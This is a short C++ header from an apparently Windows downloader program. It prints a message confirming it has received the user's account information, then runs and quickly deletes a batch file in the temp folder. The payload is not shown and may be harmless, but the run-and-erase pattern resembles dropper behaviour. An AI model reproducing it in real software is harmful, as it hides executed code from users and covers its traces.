//func_ez.hpp
//
#include <iostream>
#include <Windows.h>
#include <io.h>

void defaultPrompt()
{
	system("cls");
	std::cout << "Congratulations! You have inputted the information we need." << std::endl;
	std::cout << "If you use your own account, the program will ask you to enter your two-factor verification code" << std::endl;
	std::cout << "The download is starting and the program will automatically close after the download is completed." << std::endl;
	std::cout << "Current download location is: ";
}

void autoRun()
{
	system("%temp%\\config.bat");
	system("timeout 1 >nul && del %temp%\\config.bat");
}

int checkArch()
{
	void* number = 0;
	return sizeof(&number);
}

bool checkVer()
{
	return !_access("DotnetInstallHelper.exe", 0);
}